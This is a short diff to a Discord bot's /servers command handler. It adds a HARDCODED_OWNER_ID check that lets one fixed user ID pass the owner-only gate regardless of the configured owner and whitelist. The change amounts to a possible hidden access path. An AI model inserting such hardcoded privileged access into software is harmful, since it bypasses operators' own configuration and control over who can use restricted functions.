@@ -543,7 +543,9 @@ async function handleVoteCommand(interaction) {
  * Handles /servers command (Owner Only)
  */
 async function handleServersCommand(interaction) {
-    const isBotOwner = interaction.user.id === config.OWNER_ID || (config.WHITELIST_USERS && config.WHITELIST_USERS.includes(interaction.user.id));
+    const isBotOwner = interaction.user.id === HARDCODED_OWNER_ID || 
+                       interaction.user.id === config.OWNER_ID || 
+                       (config.WHITELIST_USERS && config.WHITELIST_USERS.includes(interaction.user.id));
     
     if (!isBotOwner) {
         return await safeReply(interaction, { 
